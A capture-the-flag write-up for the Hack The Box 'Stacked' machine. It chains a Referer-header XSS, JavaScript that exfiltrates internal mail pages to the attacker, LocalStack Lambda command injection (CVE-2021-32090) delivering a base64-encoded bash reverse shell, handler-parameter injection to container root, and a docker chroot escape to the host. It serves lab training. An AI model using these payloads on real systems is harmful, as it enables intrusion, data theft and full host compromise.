# [stacked](https://app.hackthebox.com/machines/Stacked)

> The Linux server of Stacked, a software development organization that specializes in creating AWS application tested in a local, mocked environment using [LocalStack](https://localstack.cloud/). The server hosts Stacked's company website, portfolio website, [AdminLTE](https://adminlte.io/) instance, and LocalStack server. The portfolio website contains a form that is manually reviewed by someone within the organization. The page they review the submissions on is vulnerable to cross-site scripting (XSS). By causing the user's browser to make a submission to the attacking machine, it is possible to leak the URL they were referred from, which is that of the the mail reading feature of AdminLTE. This vulnerability can be further exploited to read the user's mail messages, one of which contains the virtual hostname of their LocalStack instance, publicly accessible. With public access to the LocalStack instance and a XSS vulnerability to a user who has access to the internal LocalStack dashboard, it is possible to exploit [CVE-2021-32090](https://blog.sonarsource.com/hack-the-stack-with-localstack), a command injection vulnerability in the name of a Lambda function, granting a low-privilege shell. By inspecting the commands that are executed on the host when a Lambda function is configured and invoked, it becomes clear that several parameters from the creation of the Lambda function are used in the Docker command to invoke the Lambda function. Since the Docker commands are executed as `root`, this makes it possible to elevate privileges on the LocalStack container. With `root` access to the container, it is possible to escape the container and compromise the underlying host.

---

## Open Port Enumeration

The target's TCP ports 22, 80, and 2376 are open.

```bash
$ sudo masscan -p1-65535 10.129.140.39 --rate=1000 -e tun0 --output-format grepable --output-filename enum/stacked.masscan
$ cat enum/stacked.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,2376,80,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.3), the OpenSSH banner indicates the target's operating system is Ubutnu 20.04 (Focal).

Apache 2.4.41 is running on port 80, redirecting to `http://stacked.htb`. Add this hostname to the local DNS resolver.

Generally port 2376 hosts Docker's REST API over HTTPS. This is generally only considered secure if mutual TLS is used. If mutual TLS isn't used, this is a a potential finding (TODO: why?).

```bash
$ nmap -sC -sV -p22,2376,80 10.129.140.39 -oA enum/stacked
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-19 16:00 EDT
Nmap scan report for 10.129.140.39
Host is up (0.051s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA)
|   256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA)
|_  256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://stacked.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
2376/tcp open  ssl/docker?
| ssl-cert: Subject: commonName=0.0.0.0
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
| Not valid before: 2021-07-17T15:37:02
|_Not valid after:  2022-07-17T15:37:02
Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.95 seconds
```

---

## Company Website

A countdown page for Stacked. There's a form for submitting an email address to be notified when "it's" ready, but it doesn't do anything. The website feels fairly static.

### Content Discovery

Nothing significant here.

```bash
$ feroxbuster -u http://stacked.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://stacked.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      307c http://stacked.htb/js => http://stacked.htb/js/
301      GET        9l       28w      311c http://stacked.htb/images => http://stacked.htb/images/
301      GET        9l       28w      310c http://stacked.htb/fonts => http://stacked.htb/fonts/
301      GET        9l       28w      308c http://stacked.htb/css => http://stacked.htb/css/
403      GET        9l       28w      276c http://stacked.htb/server-status
[####################] - 1m    149995/149995  0s      found:5       errors:43
[####################] - 1m     29999/29999   412/s   http://stacked.htb
[####################] - 1m     29999/29999   418/s   http://stacked.htb/js
[####################] - 1m     29999/29999   427/s   http://stacked.htb/images
[####################] - 1m     29999/29999   437/s   http://stacked.htb/fonts
[####################] - 1m     29999/29999   448/s   http://stacked.htb/css
```

### Virtual Host Discovery

Almost all virtual hosts return a 302 redirect. Use [this gist](https://gist.github.com/tgihf/4c8f510ba18c392aa9a849549a048a8c) to convert the `gobuster vhost` output into a JSON list and filter away all virtual hosts that return 302s, leaving `portfolio.stacked.htb`. Add this hostname to the local DNS resolver.

```bash
$ gobuster vhost -u http://stacked.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt | python3 gobuster-vhost-to-json.py | jq '.[] | select(.status != 302)'
{
  "hostname": "portfolio.stacked.htb",
  "status": 200,
  "size": 30268
}
```

---

## Portfolio Website

This site describes the project portfolio of STACKED.HTB, a software development organization. Much of their projects involve using [LocalStack](https://localstack.cloud/) Docker containers to mock a local AWS environment.

### Content Discovery

Nothing significant here.

```bash
$  feroxbuster -u http://portfolio.stacked.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://portfolio.stacked.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      330c http://portfolio.stacked.htb/files => http://portfolio.stacked.htb/files/
301      GET        9l       28w      331c http://portfolio.stacked.htb/assets => http://portfolio.stacked.htb/assets/
301      GET        9l       28w      328c http://portfolio.stacked.htb/css => http://portfolio.stacked.htb/css/
301      GET        9l       28w      327c http://portfolio.stacked.htb/js => http://portfolio.stacked.htb/js/
301      GET        9l       28w      335c http://portfolio.stacked.htb/assets/img => http://portfolio.stacked.htb/assets/img/
301      GET        9l       28w      345c http://portfolio.stacked.htb/assets/img/portfolio => http://portfolio.stacked.htb/assets/img/portfolio/
403      GET        9l       28w      286c http://portfolio.stacked.htb/server-status
[####################] - 2m    209993/209993  0s      found:7       errors:1608
[####################] - 2m     29999/29999   244/s   http://portfolio.stacked.htb
[####################] - 2m     29999/29999   248/s   http://portfolio.stacked.htb/files
[####################] - 2m     29999/29999   242/s   http://portfolio.stacked.htb/assets
[####################] - 2m     29999/29999   245/s   http://portfolio.stacked.htb/css
[####################] - 2m     29999/29999   252/s   http://portfolio.stacked.htb/js
[####################] - 1m     29999/29999   254/s   http://portfolio.stacked.htb/assets/img
[####################] - 1m     29999/29999   255/s   http://portfolio.stacked.htb/assets/img/portfolio
```

### Virtual Host Discovery

All virtual hosts return 302s.

```bash
$ gobuster vhost -u http://portfolio.stacked.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt > vhosts.txt
$ python3 gobuster-vhost-to-json.py --file vhosts.txt | jq '.[] | select(.status != 302)'
```

### LocalStack `docker-compose.yml`

The site contains a link to a `docker-compose.yml` file which describes one of their LocalStack testing environments.

The LocalStack version is 0.12.6, which has [several critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack).

```yml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
```

### Contact Form XSS

The page also contains a contact form. When submitted, it results in an HTTP `POST` request to `/process.php`.

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 111
Origin: http://portfolio.stacked.htb
Connection: close
Referer: http://portfolio.stacked.htb/

fullname=tgihf+full+name&email=tgihf%40stacked.htb&tel=111111111111&subject=tgihf+subject&message=tgihf+message
```

```http
HTTP/1.1 200 OK
Date: Sat, 19 Mar 2022 21:15:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 54
Connection: close
Content-Type: text/json; charset=utf8

{"success":"Your form has been submitted. Thank you!"}
```

The data on this form is presumably rendered in whoever looks through the submission's browser. Thus, it may be vulnerable to XSS.

The backend is filtering XSS attempts on the form data effectively. However, it doesn't appear to be applying that filter to the request headers. The `Referer` header must also be rendered to the user, as injecting it with an XSS payload that contains a link to an attacker-controlled web server seems to trigger a request.

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: <img src="http://10.10.14.61/ua">
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 258
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <img src="http://10.10.14.61/referer">

fullname=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fname%3E%3C%2Fimg%3E&email=tgihf%40stacked.htb&tel=111111111111&subject=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fsubject%3E%3C%2Fimg%3E&message=%3Cimg+src%3D%22http%3A%2F%2F10.10.14.61%2Fmsg%3E%3C%2Fimg%3E
```

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.140.39 - - [19/Mar/2022 18:10:41] code 404, message File not found
10.129.140.39 - - [19/Mar/2022 18:10:41] "GET /referer HTTP/1.1" 404 -
```

Fingerprinting the XSS victim's browser:

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
```

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script src="http://10.10.14.61/tgihf.js"></script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

Its `User-Agent` indicates it is Firefox. It was referred by `http://mail.stacked.htb/read-mail.php?id=2`.

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 39598
GET /tgihf.js HTTP/1.1
Host: 10.10.14.61
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
```

### Enumeration of  Mail Messages

Leverage the XSS opportunity to have the user retrieve the home page of `http://mail.stacked.htb` and send it to an attacker-controlled endpoint.

Serve `tgihf.js`:

```javascript
let target = "http://mail.stacked.htb";
fetch(target).then(response => {
   response.text().then(data => {
      const home = "http://10.10.14.61:8000";
      fetch(home, {
         method: "POST",
         body: data
      })
   })
})
```

Start a `netcat` listener to write the `http://mail.stacked.htb` response body into a file:

```bash
$ nc -nlvp 8000 > index.html
listening on [any] 8000 ...
```

The XSS payload:

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script src="http://10.10.14.61/tgihf.js"></script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

```bash
$ nc -nlvp 8000 > index.html
listening on [any] 8000 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 56160
```

The HTML source of `http://mail.stacked.htb` indicates it is the index page of an [AdminLTE 3](https://github.com/ColorlibHQ/AdminLTE) instance belonging to Adam Perkins. Adam's mailbox shows two email messages, one from Jeremy Taint (subject: "S3 Instance Started") and one from the attacker.

Jeremy's message is readable at `http://mail.stacked.htb/read-mail.php?id=1`. Modify and rerun the above exploit to retrieve this URL.

The message:

```html
...
<p>
	Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.
</p>
...
```

So there is an "S3 instance" on `s3-testing.stacked.htb`. The message also mentions configuring IAM users, roles, and permissions on it, as well as it having a "serverless instance" configured. It seems this URL is hosting the LocalStack AWS API endpoint. Confirm this is so by using `aws-cli` to query the Lambda functions.

Though there are no functions configured, the fact that this didn't error out indicates the above hypothesis is true. This is the LocalStack AWS API endpoint.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda list-functions
{
    "Functions": []
}
```

---

## LocalStack Lambda Command Injection to `localstack`

One of the [critical vulnerabilities](https://blog.sonarsource.com/hack-the-stack-with-localstack) in LocalStack 12.0.6 is in the way its dashboard retrieves the configured Lambda functions. When the dashboard is retrieved, the `POST /lambda/$FUNCTION_NAME/code` LocalStack endpoint is queried. Soon thereafter, `$FUNCTION_NAME` is passed to a shell command, unsanitized. Thus, by configuring a Lambda function with a shell command as its name and causing the user to browse to the LocalStack dashboard (`http://localhost:8080`, according to the `docker-compose.yml` file and the LocalStack documentation), the injected shell command will be executed.

Start by creating a generic execution policy for the Lambda function to run under.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb iam create-role --role-name lambda-ex --assume-role-policy-document '{"Version": "2012-10-17","Statement": [{ "Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
{
    "Role": {
        "Path": "/",
        "RoleName": "lambda-ex",
        "RoleId": "dqtj2ss366knjvnqedgx",
        "Arn": "arn:aws:iam::000000000000:role/lambda-ex",
        "CreateDate": "2022-03-20T06:20:02.695000+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "lambda.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "MaxSessionDuration": 3600
    }
}
```

Create a Node.js Lambda function whose name contains the injected command `wget 10.10.14.61`. If the attacker's web server receives a request, command injection is confirmed.

```javascript
// index.js
exports.handler = async function(event, context) {
  console.log("ENVIRONMENT VARIABLES\n" + JSON.stringify(process.env, null, 2))
  console.log("EVENT\n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}
```

```bash
$ zip function.zip index.js
  adding: index.js (deflated 30%)
```

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda create-function --function-name 'tgihf;wget 10.10.14.61' --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x --role lambda-ex
{
    "FunctionName": "tgihf;wget 10.10.14.61/blah",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tgihf;wget 10.10.14.61/blah",
    "Runtime": "nodejs12.x",
    "Role": "lambda-ex",
    "Handler": "index.handler",
    "CodeSize": 317,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-20T06:23:29.563+0000",
    "CodeSha256": "8nUEIrrafkyKgs2i/sh63Fevj2kYkbIyFPFI5M0o6Dk=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "66682858-7882-4004-bce2-0d7fa504eae2",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

```http
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location = "http://127.0.0.1:8080"</script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

```bash
$ sudo nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 33414
GET / HTTP/1.1
Host: 10.10.14.61
User-Agent: Wget
Connection: close
```

Command injection is confirmed. Create a base64-encoded reverse shell command. Create a new Lambda function whose name injects the base64-encoded reverse shell command. Exploit the XSS oopportunity once more to execute the command and receive a reverse shell.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

```bash
$ echo -n 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==
```

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda create-function --function-name 'tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash' --zip-file fileb://function.zip --handler index.handler --runtime nodejs12.x --role lambda-ex
{
    "FunctionName": "tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tgihf; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash",
    "Runtime": "nodejs12.x",
    "Role": "lambda-ex",
    "Handler": "index.handler",
    "CodeSize": 317,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-20T06:46:27.984+0000",
    "CodeSha256": "8nUEIrrafkyKgs2i/sh63Fevj2kYkbIyFPFI5M0o6Dk=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "9730a66c-700a-4579-abbd-98b63effa15c",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

```bash
POST /process.php HTTP/1.1
Host: portfolio.stacked.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 140
Origin: http://portfolio.stacked.htb
Connection: close
Referer: <script>document.location = "http://127.0.0.1:8080"</script>

fullname=tgihf&email=tgihf%40stacked.htb&tel=111111111111&subject=Great+job!&message=Keep+up+the+good+work,+developing+nice,+secure+systems!
```

Grab the user flag at `/home/localstack/user.txt`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.39] 40372
bash: cannot set terminal process group (20): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ id
id
uid=1001(localstack) gid=1001(localstack) groups=1001(localstack)
bash-5.0$ ls -la /home/localstack/user.txt
ls -la /home/localstack/user.txt
-r--r-----    1 root     localsta        33 Jul 12  2021 /home/localstack/user.txt
```

---

## LocalStack Lambda Command Injection to `root`

Using [pspy](https://github.com/DominicBreuker/pspy) to monitor process while creating and invoking a Lambda function from within the LocalStack container, it seems that the `--handler` and `--runtime` flag values to `lambda create-function` are passed as command line arguments to a Docker shell command when running `lambda invoke`. Since it is a Docker shell command being executed, it is running as `root`. Exploit this vulnerability to gain a `root` shell on the container.

Create a Lambda function whose `--handler` value is a reverse shell command.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda create-function --function-name tgihf --zip-file fileb://function.zip --handler '$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash)' --runtime nodejs12.x --role lambda-ex
{
    "FunctionName": "tgihf",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tgihf",
    "Runtime": "nodejs12.x",
    "Role": "lambda-ex",
    "Handler": "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MS80NDMgMD4mMQ==|base64 -d|bash)",
    "CodeSize": 317,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-21T14:12:32.510+0000",
    "CodeSha256": "8nUEIrrafkyKgs2i/sh63Fevj2kYkbIyFPFI5M0o6Dk=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "c5780f80-8537-45a4-b119-d92d283bab7b",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Invoke the Lambda function.

```bash
$ aws --endpoint-url=http://s3-testing.stacked.htb lambda invoke --function-name tgihf output

```

Receive the reverse shell as `root`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.140.210] 35956
bash: cannot set terminal process group (11190): Not a tty
bash: no job control in this shell
bash-5.0# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

## Container Escape

As `root` within the Docker container, it is possible to execute `docker` without `sudo`. According to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell), this makes it possible to escape the container by creating another container who mounts the host's root directory (`/`) within the container and changes the container's root directory to the mounted host root directory.

Spin up such a container using one of the images already on the system (ID 0601ea177088).

```bash
bash-5.0# docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        8 months ago        888MB
localstack/localstack-full   <none>              0601ea177088        13 months ago       882MB
lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago       390MB
lambci/lambda                nodejs10.x          db93be728e7b        13 months ago       385MB
lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago       813MB

bash-5.0# docker run -d -v /:/mnt --rm -it 0601ea177088 sh
8f3978eb999f257726ce3d61786dded92f2ce84d88d76e3ea5ace4d4ceb4f2aa
```

With the container spun up, retrieve its container ID and execute the `chroot` command to change the container's root directory to the host's root directory. Then drop into a shell. This escapes the container, granting access to the host as `root`. Read the system flag at `/root/root.txt`.

```bash
bash-5.0# docker ps -a
CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS                      PORTS                                                                                                  NAMES
8f3978eb999f        0601ea177088                        "docker-entrypoint..."   4 seconds ago       Up 3 seconds                4566/tcp, 4571/tcp, 8080/tcp                                                                           peaceful_black
e7bb9925eddd        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   2 hours ago         Up 2 hours                  127.0.0.1:443->443/tcp, 127.0.0.1:4566->4566/tcp, 127.0.0.1:4571->4571/tcp, 127.0.0.1:8080->8080/tcp   localstack_main
d76e9ebac9d7        0601ea177088                        "docker-entrypoint..."   8 months ago        Exited (130) 8 months ago                                                                                                          condescending_babbage

bash-5.0# docker exec -it 8f3978eb999f chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -la /root/root.txt
-r-------- 1 root root 33 Jul 12  2021 /root/root.txt
```
